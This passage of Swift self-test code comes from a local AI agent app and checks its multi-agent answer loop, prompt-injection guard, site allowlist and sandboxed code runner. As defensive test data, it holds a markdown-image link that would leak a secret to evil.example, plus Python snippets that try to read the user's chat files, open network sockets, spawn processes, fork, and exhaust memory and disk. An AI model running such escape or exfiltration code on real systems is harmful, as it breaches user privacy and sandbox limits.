        let copied = SharedNotes.holdingFirm(.init(agent: solver, note: "", answer: "ta"), after: first)
        expect("no change without a reason", copied.answer == "tungsten" && copied.problems.count == 1)
        let hollow = SharedNotes.holdingFirm(.init(agent: solver, note: "Why: agreed.", answer: "ta"), after: first)
        expect("a word or two isn't a reason", hollow.answer == "tungsten")
        let reasoned = SharedNotes.holdingFirm(.init(agent: solver, note: "Why: tantalum is 73, not 74.", answer: "ta"), after: first)
        expect("a change with a reason stands", reasoned.answer == "ta" && reasoned.problems.isEmpty)
        let kept = SharedNotes.holdingFirm(.init(agent: solver, note: "", answer: "Tungsten"), after: first)
        expect("keeping an answer needs no reason", kept.answer == "Tungsten" && kept.problems.isEmpty)
        expect("the first round has nothing to hold to", SharedNotes.holdingFirm(first, after: nil).answer == "tungsten")

        var notes = SharedNotes(model: "m", task: "What is 6 × 7?", evidence: ["<untrusted source=\"page\">\nFacts.\n</untrusted>"])
        notes.rounds = [[entry(solver, "40"), entry(skeptic, "42")]]
        let blind = notes.reading(for: explorer, round: 1, characters: 4_000)
        expect("round 1 reads the task and tools only", blind.contains("6 × 7") && blind.contains("Facts.") && !blind.contains("Note by"))
        let open = notes.reading(for: skeptic, round: 2, characters: 4_000)
        expect("round 2 reads the others", open.contains("Note by Solver.") && open.contains("Answer: 40") && open.contains("### Skeptic (you)"))

        notes.rounds = (1...5).map { round in CouncilAgent.all.map { .init(agent: $0, note: "Round \(round). " + String(repeating: "x", count: 500), answer: "\(round)") } }
        let tight = notes.reading(for: solver, round: 6, characters: 2_000)
        expect("the file fits the context (\(tight.count) characters)", tight.count <= 2_400)
        expect("newest round stays, oldest goes", tight.contains("## Round 5") && !tight.contains("## Round 1") && tight.contains("left out"))
        expect("the file itself keeps every round", notes.markdown.contains("## Round 1") && notes.markdown.contains("## Round 5"))

        // Saved files have to survive a version name this build has never heard of.
        let decoder = JSONDecoder(), encoder = JSONEncoder()
        let saved = Data(#"{"id":"11111111-1111-1111-1111-111111111111","role":"assistant","content":"Hi","createdAt":0,"harnessVersion":"a-later-version"}"#.utf8)
        let message = try? decoder.decode(ChatMessage.self, from: saved)
        expect("an unknown version name still loads", message?.content == "Hi" && message?.harnessVersion?.version == nil)
        let again = message.flatMap { try? encoder.encode($0) }.map { String(decoding: $0, as: UTF8.self) } ?? ""
        expect("saving keeps an unknown version name", again.contains(#""harnessVersion":"a-later-version""#))
        let known = (try? encoder.encode(SavedHarnessVersion(.council))).map { String(decoding: $0, as: UTF8.self) }
        expect("a version saves as its plain name, as it always has", known == #""council""#)
        var unknownRun = ModelTestResult(harness: true, harnessRounds: 3, model: "m", displayName: "m", quant: "q", quantProvider: "p", backend: "b", thinking: true, contextLength: 4_096)
        unknownRun.harnessVersion = message?.harnessVersion
        expect("a run from another build doesn't pass for the loop", unknownRun.version == nil)
        let broken = ConversationStore.directory.appendingPathComponent("self-check-\(UUID().uuidString).json")
        try? Data("not json".utf8).write(to: broken)
        ConversationStore.setAside(broken)
        let folder = (try? FileManager.default.contentsOfDirectory(atPath: ConversationStore.directory.path)) ?? []
        let copies = folder.filter { $0.hasPrefix(broken.deletingPathExtension().lastPathComponent + ".unreadable-") }
        expect("an unreadable file is kept", copies.count == 1)
        try? FileManager.default.removeItem(at: broken)
        for copy in copies { try? FileManager.default.removeItem(at: ConversationStore.directory.appendingPathComponent(copy)) }

        let cut = SharedNotes.cut("<untrusted source=\"page\">\n" + String(repeating: "x", count: 500) + "\n</untrusted>", to: 100)
        expect("cutting a source closes it", cut.hasSuffix("</untrusted>"))

        let name = "Tests/self-check-\(UUID().uuidString)"
        notes.save(as: name)
        let url = SharedNotes.fileURL(named: name)
        expect("the file reaches the disk", (try? String(contentsOf: url, encoding: .utf8)) == notes.markdown)
        SharedNotes.discard([name])
        expect("the file goes with its reply", !FileManager.default.fileExists(atPath: url.path))
        return lines
    }

    private static func harnessCheck() async -> String {
        var lines: [String] = []
        func expect(_ name: String, _ ok: Bool) { lines.append("\(ok ? "PASS" : "FAIL") \(name)") }
        expect("100 trusted sites, no duplicates", TrustedSites.all.count == 100 && Set(TrustedSites.all.map(\.domain)).count == 100)
        for (address, trusted) in [("https://en.wikipedia.org/wiki/Bee", true), ("https://docs.python.org/3/", true),
                                   ("http://en.wikipedia.org/wiki/Bee", false), ("https://wikipedia.org.evil.example/x", false),
                                   ("https://evilwikipedia.org/x", false), ("https://evil.example/?u=wikipedia.org", false)] {
            expect("allowlist \(address) -> \(trusted)", URL(string: address).map(TrustedSites.isTrusted) == trusted)
        }
        for (expression, result) in [("47*23", "1081"), ("powmod(7,2025,1000)", "807"), ("comb(10,3)", "120"), ("2^10 + (3-1)*4", "1032"),
                                     ("10/4", "2.5"), ("factorial(5)", "120"), ("gcd(100,75)", "25"), ("-3+5", "2")] {
            expect("calc \(expression) = \(result)", Calculator.evaluate(expression) == result)
        }
        expect("calc rejects code", Calculator.evaluate("system('ls')").hasPrefix("Error"))
        expect("calc rejects divide by zero", Calculator.evaluate("1/0").hasPrefix("Error"))
        for attack in InjectionSuite.cases {
            let clean = PromptGuard.sanitize(attack.page)
            let survived = attack.canaries.contains { clean.text.contains($0) } && attack.id != "hidden-comment" && attack.id != "false-authority"
            expect("guard removes \(attack.id) (removed \(clean.removed))", clean.removed > 0 && !survived)
            expect("guard keeps the facts of \(attack.id)", clean.text.localizedCaseInsensitiveContains(attack.topicWord))
        }
        let ordinary = "You must install Python first. The system has a default prompt. Rules of the game are simple. Previous versions were slower."
        expect("guard leaves ordinary text alone", PromptGuard.sanitize(ordinary).removed == 0)
        let filtered = PromptGuard.filterReply("See ![x](https://evil.example/log?d=1) and https://en.wikipedia.org/wiki/Bee with ZEBRA-9183.", secret: "ZEBRA-9183")
        expect("reply filter: \(filtered.text)", filtered.blocked == 2 && !filtered.text.contains("evil.example")
               && !filtered.text.contains("ZEBRA") && filtered.text.contains("en.wikipedia.org"))
        let html = "<p>Visible</p><div style=\"display:none\">secret</div><!-- c --><script>x()</script><span hidden>h</span>"
        expect("hidden HTML removed: \(WebTools.plainText(html))", WebTools.plainText(html) == "Visible")
        let results = (try? await WebTools.search("Mordell conjecture proof").get()) ?? ""
        lines.append("SEARCH:\n\(results.prefix(900))")
        expect("search returns Wikipedia", results.contains("wikipedia.org"))
        switch await WebTools.open("https://en.wikipedia.org/wiki/Faltings%27s_theorem?stolen=data") {
        case .success(let text):
            expect("page opens as text (\(text.count) chars)", text.contains("Faltings") && !text.contains("<div"))
            lines.append("PAGE START: \(text.prefix(300))")
        case .failure(let error):
            expect("page opens: \(error.message)", false)
            lines.append("ERROR: \(WebTools.lastError.prefix(600))")
        }
        if case .failure(let error) = await WebTools.open("https://evil.example/x") {
            expect("untrusted page refused: \(error.message)", true)
        } else {
            expect("untrusted page refused", false)
        }
        // The loop's parts that need no model.
        let suite = ModelTestSuite.questions(contextLength: 4_096)
        let quick = Dictionary(grouping: suite.filter { ModelTestSuite.quickIDs.contains($0.id) }, by: \.category)
        expect("Normal asks every task on its list", quick.values.reduce(0) { $0 + $1.count } == ModelTestSuite.quickIDs.count)
        expect("Normal has three tasks in each of three topics", quick.count == 3 && quick.values.allSatisfy { $0.count == 3 })
        func prompt(_ id: String) -> String { suite.first { $0.id == id }?.prompt ?? "" }
        let kinds: [String: TestLab.TaskKind] = ["math": .calculation, "reason": .other, "know": .fact, "follow": .writing, "code": .code, "long": .document]
        for question in suite {
            let kind = TestLab.plainKind(of: HarnessTask(prompt: question.prompt))
            expect("\(question.id) reads as \(kind?.rawValue ?? "unknown")", kind == kinds[String(question.id.prefix { $0 != "-" })])
        }
        let sea = TextRules(task: prompt("follow-3"))
        expect("rules of follow-3", sea.unit == .sentence && sea.count == 3 && sea.wordsAt == [1: 5] && sea.startLetter == "s" && sea.bannedWords == ["water"])
        expect("good text passes", sea.violations(of: "Seas sing to sailors. Sharks swim very far out. Salt stings all sailors.").isEmpty)
        let broken = sea.violations(of: "Seas sing. Waves crash on the shore today now. Salt water stings.")
        expect("bad text fails: \(broken)", broken.count == 3)
        let poem = TextRules(task: prompt("follow-4"))
        expect("rules of follow-4", poem.unit == .line && poem.count == 4 && poem.wordsAt == [0: 3, 1: 5, 2: 7, 3: 9] && poem.startLetter == "t" && poem.bannedLetters == ["e"])
        let sky = TextRules(task: prompt("follow-1"))
        expect("rules of follow-1", sky.totalWords == 3 && sky.lowercase && sky.noPunctuation)
        expect("tidied words: \(sky.tidied("Blue, Vast, Endless."))", sky.tidied("Blue, Vast, Endless.") == "blue vast endless")
        let json = TextRules(task: prompt("follow-2"))
        expect("rules of follow-2", json.jsonOnly && json.jsonKeys == ["name", "age"])
        expect("fences removed", json.violations(of: json.tidied("```json\n{\"name\": \"Al\", \"age\": 3}\n```")).isEmpty)
        let form = TextRules(task: prompt("math-1"))
        expect("last line form", form.finalLabel == "Answer" && !form.hasShape)
        expect("placeholder cleared: \(form.tidied("Answer: <your answer>22"))", form.tidied("Answer: <your answer>22") == "Answer: 22")
        expect("angle brackets cleared", form.tidied("Answer: <Lee> /think") == "Answer: Lee")
        expect("empty last line fails", !form.violations(of: "Answer:").isEmpty && form.violations(of: "Answer: 12").isEmpty)
        for (id, wanted, unwanted) in [("long-1", "MAPLE-7342", ""), ("long-2", "current access code", ""), ("long-3", "K-552", "K-525")] {
            let task = HarnessTask(prompt: prompt(id))
            let found = PassageFinder.chain(in: task.document ?? "", for: task.body, maxCharacters: 2_000).passages
            lines.append("\(id) passages: \(found)")
            expect("\(id) finds \(wanted)", found.contains { $0.contains(wanted) } && (unwanted.isEmpty || !found.contains { $0.contains(unwanted) }))
        }
        let audit = HarnessTask(prompt: prompt("long-4"))
        let auditLines = PassageFinder.chain(in: audit.document ?? "", for: audit.body, maxCharacters: 2_400, closeness: 0.55).passages
        lines.append("long-4 passages: \(auditLines)")
        expect("long-4 counts and finds every notice", audit.needsCounting && auditLines.filter { $0.hasPrefix("Notice") }.count >= 3)
        for (output, result) in [("54.0", "54"), ("1\n4\n6", "1 4 6"), ("The total is 12 crates", "12")] {
            expect("result of \(output.debugDescription) is \(result)", HarnessText.keyResult(of: output) == result)
        }
        expect("result in one string", HarnessText.mentions("1 4 6 3 5 2", in: "Work.\nAnswer: 146352", label: "Answer"))
        expect("result missing", !HarnessText.mentions("126", in: "Answer: 125", label: "Answer"))
        expect("result written in", HarnessText.adding("126", to: "Hm.\nAnswer: 125", label: "Answer") == "Hm.\nAnswer: 126")
        expect("query cleaned", HarnessText.cleanQuery("Answer: Ramesses II, Hittite, Kadesh, treaty") == "Ramesses II Hittite Kadesh treaty")
        let ranked = HarnessText.ranked([SearchHit(title: "Hittites", url: "https://en.wikipedia.org/wiki/Hittites"),
                                         SearchHit(title: "Egyptian–Hittite peace treaty", url: "https://en.wikipedia.org/wiki/Treaty")], for: "peace treaty Hittite")
        expect("best title first", ranked.first?.title.contains("treaty") == true)
        // The arithmetic shortcut has to be right or stay out of the way.
        for (task, result) in [("What is 47 × 23?", "1081"), ("What is 7^222 mod 1000?", "49"),
                               ("What is the remainder when 7^2025 is divided by 1000?", "807")] {
            expect("sum in \(task) is \(result)", TestLab.exactArithmetic(in: task)?.1 == result)
        }
        for task in ["What is 7^2025?", "What is 2^300?", "What is 17 + 5 modulo 3?", "What are the last two digits of 3 * 77777?"] {
            expect("no shortcut for \(task)", TestLab.exactArithmetic(in: task) == nil)
        }
        lines += councilCheck()
        // The gate, once the web has been read.
        var gate = ToolGate()
        let search = ToolCall(name: "web_search", arguments: ["query": "bees"])
        let link = "https://en.wikipedia.org/wiki/Bee"
        func open(_ address: String) -> ToolCall { ToolCall(name: "open_page", arguments: ["url": address]) }
        expect("gate lets the first search through", gate.refusal(of: search) == nil)
        gate.note(search, result: "1. Bee — \(link)\n   Bees are insects.")
        expect("gate refuses a second search", gate.refusal(of: search) != nil)
        expect("gate opens a link it was given", gate.refusal(of: open(link)) == nil)
        expect("gate refuses any other page", gate.refusal(of: open("https://en.wikipedia.org/wiki/my-secret-chat")) != nil)
        expect("gate leaves the calculator open", gate.refusal(of: ToolCall(name: "calculate", arguments: ["expression": "1+1"])) == nil)
        // Which version older runs were.
        func oldRun(rounds: Int?, log: [String]) -> ModelTestResult {
            var run = ModelTestResult(harness: true, harnessRounds: rounds, model: "m", displayName: "m", quant: "q", quantProvider: "p",
                                      backend: "b", thinking: false, contextLength: 1)
            run.items = [ModelTestItemResult(id: "a", category: .math, title: "t", expected: "e", answer: "a", passed: true, seconds: 1, toolLog: log)]
            return run
        }
        expect("old run with rounds is the loop", oldRun(rounds: 3, log: ["Understood: fact task"]).version == .loop)
        expect("old run that logged a task is the pipeline", oldRun(rounds: nil, log: ["Understood: fact task"]).version == .pipeline)
        expect("old run that logged nothing is model tools", oldRun(rounds: nil, log: []).version == .tools)
        lines += await stepThinkingCheck()
        lines += await councilRunCheck()
        // The code runner, against code trying to get out. Every attempt has to fail.
        let home = NSHomeDirectory()
        let attacks: [(String, String)] = [
            ("read chats", "print(open('\(home)/Library/Application Support/LocalAIAgent/conversations.json').read(9))"),
            ("list Documents", "import os; print(os.listdir('\(home)/Documents'))"),
            ("write home", "open('\(home)/prometheus-escape.txt','w').write('x'); print('wrote')"),
            ("write tmp", "open('/tmp/prometheus-escape.txt','w').write('x'); print('wrote')"),
            ("internet", "import socket; socket.create_connection(('1.1.1.1',443),3); print('connected')"),
            ("Ollama", "import socket; socket.create_connection(('127.0.0.1',11434),3); print('connected')"),
            ("run a program", "import subprocess; print(subprocess.run(['/bin/ls','/'],capture_output=True).stdout)"),
            ("fork", "import os; print('forked', os.fork())"),
            ("signal launchd", "import os; os.kill(1,0); print('signalled')"),
        ]
        for (name, code) in attacks {
            let outcome = await CodeRunner.run("print('started', flush=True)\n" + code + "\n", language: .python)
            // It has to have really started, or the failure proves nothing.
            expect("code can't \(name): \(outcome.output.split(separator: "\n").last ?? "")",
                   !outcome.succeeded && outcome.output.hasPrefix("started"))
        }
        let added = await CodeRunner.run("print(sum(i*i for i in range(4)))\n", language: .python)
        expect("python runs: \(added.output)", added.succeeded && added.output == "14")
        let order = await CodeRunner.run("console.log(1);setTimeout(()=>console.log(2),0);Promise.resolve().then(()=>console.log(3))\n", language: .javascript)
        expect("javascript runs: \(order.output.replacingOccurrences(of: "\n", with: " "))", order.succeeded && order.output == "1\n3\n2")
        let file = await CodeRunner.run("print(open('task.txt').read())\n", language: .python, files: ["task.txt": "hello", "../escape.txt": "x"])
        expect("files reach the code: \(file.output)", file.output == "hello")
        let hang = await CodeRunner.run("while True: pass\n", language: .python)
        expect("endless loop stopped: \(hang.output)", hang.limit != nil && !hang.succeeded)
        let flood = await CodeRunner.run("while True: print('x'*1000)\n", language: .python)
        expect("output flood stopped (\(flood.output.count) chars)", flood.limit != nil && flood.output.count < 9_000)
        let memory = await CodeRunner.run("print('started', flush=True)\nx=[]\nwhile True: x.append(bytearray(b'x'*50000000))\n", language: .python)
        expect("memory bomb stopped: \(memory.output.suffix(50))", !memory.succeeded && memory.output.hasPrefix("started"))
        let disk = await CodeRunner.run("print('started', flush=True)\nf=open('big','wb')\nwhile True: f.write(b'x'*1000000); f.flush()\n", language: .python)
        expect("disk filler stopped: \(disk.output.suffix(50))", !disk.succeeded && disk.output.hasPrefix("started"))
        return lines.joined(separator: "\n")
    }

    /// v5 from start to finish against scripted agents, so this runs no real model.
    private static func councilRunCheck() async -> [String] {
        var lines: [String] = []
        func expect(_ name: String, _ ok: Bool) { lines.append("\(ok ? "PASS" : "FAIL") \(name)") }
        func finished(_ reason: String) -> StreamEvent {
            var stats = BackendStats()
            stats.stopReason = reason
            return .finished(stats)
        }
        func text(_ request: ChatRequest) -> String { request.messages.last?.content ?? "" }
        func isTurn(_ request: ChatRequest) -> Bool { text(request).contains("You are the ") }
        func isNote(_ request: ChatRequest) -> Bool { text(request).contains("Round ") && text(request).contains("You are the ") && !text(request).contains("discussion is over") }
        func isSpeaker(_ name: String, _ request: ChatRequest) -> Bool { text(request).contains("You are the \(name).") }
        func round(_ request: ChatRequest) -> Int { text(request).contains("Round 1. ") ? 1 : 2 }
        /// Thinks when asked to, and writes what the script gives it. Anything but an agent's turn is the classifying step.
        func agents(_ script: @escaping (ChatRequest) -> String) -> (ChatRequest) -> [StreamEvent] {
            { request in
                guard isTurn(request) else { return [.content("TYPE: OTHER"), finished("stop")] }
                return (request.think == true ? [.thinking("hmm")] : []) + [.content(script(request)), finished("stop")]
            }
        }
        func run(_ prompt: String, think: Bool? = false, rounds: Int = 3, _ script: @escaping (ChatRequest) -> [StreamEvent])
            async -> (requests: [ChatRequest], reply: TestLab.Reply) {
            let backend = ScriptedBackend(script: script)
            var setup = TestLab.TestSetup(model: LocalModel(id: "scripted"), backend: backend, context: 4_096, think: think, supportsTools: false)
            setup.maxRounds = rounds
            let reply = await TestLab.harnessReply(.council, prompt: prompt, setup: setup, maxTokens: 512)
            return (backend.requests, reply)
        }
        let puzzle = "Three friends share a secret number. Think about it carefully and tell me the number they share."
        let reason = "Why: I worked through it step by step.\n"

        let agreed = await run(puzzle, agents { isNote($0) ? "\(reason)Answer: 7" : "The number is 7.\nAnswer: 7" })
        let turns = agreed.requests.filter(isTurn)
        expect("three notes and a reply when they agree at once (\(turns.count))", turns.count == 4)
        expect("each agent keeps its own temperature", turns.prefix(3).map(\.temperature) == CouncilAgent.all.map(\.temperature))
        expect("thinking stays on with Think off", turns.allSatisfy { $0.think == true })
        expect("preparing the file doesn't think", agreed.requests.filter { !isTurn($0) }.allSatisfy { $0.think == false })
        expect("the reply is the group's: \(agreed.reply.answer)", agreed.reply.answer.contains("7"))
        expect("agreement is logged", agreed.reply.toolLog.contains("All three agree on 7"))
        let none = await run(puzzle, think: nil, agents { _ in "\(reason)Answer: 7" })
        expect("a model that can't think sends no setting", none.requests.allSatisfy { $0.think == nil })

        // Round 1 is blind, later rounds aren't, and a change needs a reason.
        var seen: [String] = []
        let talk = await run(puzzle) { request in
            guard isTurn(request) else { return [.content("TYPE: OTHER"), finished("stop")] }
            seen.append(text(request))
            let say: (String) -> [StreamEvent] = { [.thinking("A private thought"), .content($0), finished("stop")] }
            let solver = isSpeaker("Solver", request), skeptic = isSpeaker("Skeptic", request)
            if text(request).contains("discussion is over") { return say("Answer: 8") }
            if round(request) == 1 { return say("\(reason)Answer: \(solver ? 7 : skeptic ? 8 : 9)") }
            // The Solver copies without a word. The Explorer has a reason to come round.
            return say(solver ? "Answer: 8" : "\(reason)Answer: 8")
        }
        expect("round 1 is blind", seen.count > 2 && !seen[1].contains("I worked through it") && !seen[2].contains("I worked through it"))
        expect("round 2 reads round 1", seen.count > 3 && seen[3].contains("## Round 1") && seen[3].contains("I worked through it"))
        expect("a bare change doesn't count", talk.reply.toolLog.contains { $0.hasPrefix("Solver answered: 7") && $0.contains("without a reason") })
        expect("a change with a reason counts", talk.reply.toolLog.contains("Explorer answered: 8"))
        expect("two of three decide: \(talk.reply.answer)", talk.reply.toolLog.contains("2 of 3 agree on 8") && talk.reply.answer.contains("8"))
        expect("agents never read each other's thinking", !seen.contains { $0.contains("A private thought") })

        // Nobody moves, so more rounds would only cost time.
        let stuck = await run(puzzle, agents { request in
            isNote(request) ? "\(reason)Answer: \(isSpeaker("Solver", request) ? 1 : isSpeaker("Skeptic", request) ? 2 : 3)" : "Answer: 2"
        })
        expect("the talk ends when nobody moves", stuck.reply.toolLog.contains { $0.hasPrefix("Nobody changed") })
        expect("no agreement means the writer decides: \(stuck.reply.answer)", stuck.reply.answer.contains("2"))

        // Thinking until the tokens run out: the retry gets the thinking back, and no answer is made up from a cut-off.
        let lost = await run(puzzle) { request in
            guard isTurn(request) else { return [.content("TYPE: OTHER"), finished("stop")] }
            if isSpeaker("Skeptic", request), request.think == true { return [.thinking("The trail of reasoning so far"), finished("length")] }
            return [.content("\(reason)Answer: 7"), finished("stop")]
        }
        expect("an agent that runs out of tokens finishes from there", lost.requests.contains { $0.think == false && text($0).contains("The trail of reasoning so far") })
        expect("and it still counts", lost.reply.toolLog.contains("All three agree on 7"))
        let cut = await run(puzzle, rounds: 1) { request in
            guard isTurn(request) else { return [.content("TYPE: OTHER"), finished("stop")] }
            if isSpeaker("Explorer", request), isNote(request) { return [.content("This creates a"), finished("length")] }
            return [.content("\(reason)Answer: 7"), finished("stop")]
        }
        expect("a cut-off reply is no answer", cut.reply.toolLog.contains("Explorer gave no answer") && cut.reply.toolLog.contains("2 of 3 agree on 7"))

        // A tool's result beats the group, even all of it.
        let sum = await run("What is 47 × 23?\n\nWork it out, then finish with a last line in exactly this form:\nAnswer: <your answer>",
                            agents { isNote($0) ? "\(reason)Answer: 1000" : "Answer: 1000" })
        expect("the calculator outranks the agents: \(sum.reply.answer)", sum.reply.answer.contains("1081") && !sum.reply.answer.contains("1000"))

        // A draft that passes the checks is the reply, with no extra turn to spoil it.
        let form = await run("Write exactly 3 words about the sky, in all lowercase, with no punctuation.", agents { _ in "blue vast endless" })
        expect("a passing draft is the reply: \(form.reply.answer)", form.reply.answer == "blue vast endless" && form.requests.filter(isTurn).count == 3)
        return lines
    }

    /// What v3 and v4 ask of a model at each step, against a scripted one, so this runs no real model.
    private static func stepThinkingCheck() async -> [String] {
        var lines: [String] = []
        func expect(_ name: String, _ ok: Bool) { lines.append("\(ok ? "PASS" : "FAIL") \(name)") }
        func finished(_ reason: String) -> StreamEvent {
            var stats = BackendStats()
            stats.stopReason = reason
            return .finished(stats)
        }
        /// A model that thinks when asked to and always has a reply.
        func willing(_ reply: String) -> (ChatRequest) -> [StreamEvent] {
            { request in (request.think == true ? [.thinking("hmm")] : []) + [.content(reply), finished("stop")] }
        }
        func isStep(_ request: ChatRequest) -> Bool { request.messages.last?.content.contains("Don't solve this yet") == true }
        func run(_ version: HarnessVersion, _ prompt: String, think: Bool?, _ script: @escaping (ChatRequest) -> [StreamEvent])
            async -> (requests: [ChatRequest], reply: TestLab.Reply) {
            let backend = ScriptedBackend(script: script)
            let setup = TestLab.TestSetup(model: LocalModel(id: "scripted"), backend: backend, context: 8_192, think: think, supportsTools: false)
            let reply = await TestLab.harnessReply(version, prompt: prompt, setup: setup, maxTokens: 512)
            return (backend.requests, reply)
        }
        let room = 2_048
        let plain = "Tell me something nice about autumn."

        let v4 = await run(.thinking, plain, think: true, willing("Autumn is lovely."))
        expect("v4 thinks at Understand, with room", v4.requests.first?.think == true && v4.requests.first?.maxTokens == 120 + room)
        expect("v4 thinks at Answer", v4.requests.last?.think == true)
        expect("v4 logs each step's thinking", v4.reply.toolLog.contains("Understand: thought for 1 tokens") && v4.reply.toolLog.contains("Answer: thought for 1 tokens"))
        let v3 = await run(.loop, plain, think: true, willing("Autumn is lovely."))
        expect("v3 still skips thinking at Understand", v3.requests.first?.think == false && v3.requests.first?.maxTokens == 120)
        expect("v3 still logs no thinking", !v3.reply.toolLog.contains { $0.contains("thought for") })
        let off = await run(.thinking, plain, think: false, willing("Autumn is lovely."))
        expect("v4 with Think off asks what v3 does", off.requests.map(\.think) == [false, false] && off.requests.first?.maxTokens == 120)
        let none = await run(.thinking, plain, think: nil, willing("Autumn is lovely."))
        expect("v4 on a model that can't think sends no setting", none.requests.allSatisfy { $0.think == nil })

        let lostStep = await run(.thinking, plain, think: true) { request in
            request.think == true && isStep(request) ? [.thinking("hmm"), finished("length")] : willing("Autumn is lovely.")(request)
        }
        expect("a step that runs out of room goes again without thinking",
               lostStep.requests.map(\.think) == [true, false, true] && lostStep.requests[1].maxTokens == 120
                   && lostStep.reply.toolLog.contains("Understand: ran out of room thinking, so it went again without"))
        let lostAnswer = await run(.thinking, plain, think: true) { request in
            request.think == true && !isStep(request) ? [.thinking("hmm"), finished("length")] : willing("Autumn is lovely.")(request)
        }
        expect("an answer that runs out of room goes again without thinking",
               lostAnswer.requests.last?.think == false && lostAnswer.requests.last?.maxTokens == 384 && lostAnswer.reply.answer == "Autumn is lovely.")
        var cutOnce = false
        let cut = await run(.thinking, plain, think: true) { request in
            guard !isStep(request), !cutOnce else { return willing("Autumn is lovely.")(request) }
            cutOnce = true
            return [.thinking("hmm"), .content("Autumn is"), finished("length")]
        }
        expect("a cut off reply is retried without thinking", cut.requests.last?.think == false && cut.requests.last?.maxTokens == 384)

        let sum = "How much do 3 boxes of 12 eggs weigh if each egg is 50 grams?"
        let program: (ChatRequest) -> [StreamEvent] = { request in
            willing(request.messages.last?.content.contains("Write a real Python program") == true ? "```python\nprint(1800)\n```" : "Answer: 1800")(request)
        }
        let v4Sum = await run(.thinking, sum, think: true, program)
        expect("v4 thinks before writing a program", v4Sum.requests.first?.think == true && v4Sum.requests.first?.maxTokens == 1_024 + room)
        expect("v4 thinks before stating a result", v4Sum.requests.last?.think == true && v4Sum.requests.last?.maxTokens == 384 + room)
        expect("v4 still gets the program's result: \(v4Sum.reply.answer)", v4Sum.reply.answer.contains("1800"))
        let v3Sum = await run(.loop, sum, think: true, program)
        expect("v3 still doesn't think there", v3Sum.requests.first?.think == false && v3Sum.requests.first?.maxTokens == 1_024
                   && v3Sum.requests.last?.think == false && v3Sum.requests.last?.maxTokens == 384)

        let poem = "Write exactly 2 sentences about rain. Each sentence must start with the letter S."
        func isRewrite(_ request: ChatRequest) -> Bool { request.messages.first?.content.hasPrefix("Topic:") == true }
        let v4Poem = await run(.thinking, poem, think: true, willing("Rain falls. Rain stops."))
        let v3Poem = await run(.loop, poem, think: true, willing("Rain falls. Rain stops."))
        expect("v4 thinks through rewrites", v4Poem.requests.contains(where: isRewrite) && v4Poem.requests.filter(isRewrite).allSatisfy { $0.think == true && $0.maxTokens == 80 + room })
        expect("v3 still rewrites without thinking", v3Poem.requests.contains(where: isRewrite) && v3Poem.requests.filter(isRewrite).allSatisfy { $0.think == false && $0.maxTokens == 80 })

        let sentences = TextRules(task: "Write exactly 3 sentences about the sea.")
        expect("a rewritten sentence with no full stop stays apart", sentences.units(of: sentences.joined(["Sea waves crash", "Salt hangs in air!", "Sun sets."])).count == 3)
        expect("sentences that end properly are left alone", sentences.joined(["One two.", "Three?"]) == "One two. Three?")
        let verse = TextRules(task: "Write a 2-line poem about the sea.")
        expect("lines get no full stops", verse.joined(["Sea waves crash", "Salt hangs"]) == "Sea waves crash\nSalt hangs")

        var setup = TestLab.TestSetup(model: LocalModel(id: "scripted"), backend: ScriptedBackend(script: willing("Yes.")), context: 4_096, think: true, supportsTools: false)
        expect("no thinking without a time limit", !setup.thinksAtSteps)
        setup.thinkingUntil = .distantPast
        expect("thinking stops at the limit", !setup.thinksAtSteps)
        setup.thinkingUntil = .distantFuture
        expect("room fits a small context", TestLab.thinkingRoom(setup) == 1_024 && setup.thinksAtSteps)
        var heard = ""
        var total = TestLab.Reply()
        total.onThought = { heard += $0 }
        let turns = [ChatTurn(role: "user", content: "Hello")]
        _ = await TestLab.stepReply(.understand, turns, setup: setup, tokens: 40, total: &total)
        _ = await TestLab.stepReply(.act, turns, setup: setup, tokens: 40, total: &total)
        expect("chat hears each step's thinking under its name", heard == "Understand:\nhmm\n\nAct:\nhmm")
        expect("each step's thinking is counted once", total.thinkingTokens == 2)
        return lines
    }

    private static func tourFrame() -> NSBitmapImageRep? {
        guard let window = NSApp.windows.first(where: { $0.isVisible && $0.className.contains("AppKitWindow") }) ?? NSApp.mainWindow,
              let view = window.contentView?.superview ?? window.contentView,
              let frame = view.bitmapImageRepForCachingDisplay(in: view.bounds) else { return nil }
        view.cacheDisplay(in: view.bounds, to: frame)
        return frame
    }

    static func snapshot(to path: String) {
        guard let window = NSApp.windows.first(where: { $0.isVisible && $0.className.contains("AppKitWindow") }) ?? NSApp.mainWindow else { return }
        write(window, to: path)
        if let sheet = window.attachedSheet {
            write(sheet, to: path.replacingOccurrences(of: ".png", with: "-sheet.png"))
        }
        for (i, popover) in NSApp.windows.filter({ $0.isVisible && $0.className.contains("Popover") }).enumerated() {
            write(popover, to: path.replacingOccurrences(of: ".png", with: "-popover\(i).png"))
        }
    }

    private static func write(_ window: NSWindow, to path: String) {
        guard let view = window.contentView?.superview ?? window.contentView,
              let rep = view.bitmapImageRepForCachingDisplay(in: view.bounds) else { return }
        view.cacheDisplay(in: view.bounds, to: rep)
        try? rep.representation(using: .png, properties: [:])?.write(to: URL(fileURLWithPath: path))
    }
}

/// A model that replies from a script and keeps what it was asked.
final class ScriptedBackend: LLMBackend, @unchecked Sendable {
    let kind = BackendKind.ollama
    let baseURL = URL(string: "http://localhost")!
    private let script: (ChatRequest) -> [StreamEvent]
    private(set) var requests: [ChatRequest] = []

    init(script: @escaping (ChatRequest) -> [StreamEvent]) { self.script = script }

    func ping() async throws -> String { "" }
    func listModels() async throws -> [LocalModel] { [] }

    func chat(_ request: ChatRequest) -> AsyncThrowingStream<StreamEvent, Error> {
        requests.append(request)
        let events = script(request)
        return AsyncThrowingStream { continuation in
            events.forEach { continuation.yield($0) }
            continuation.finish()
        }
    }
}
#endif
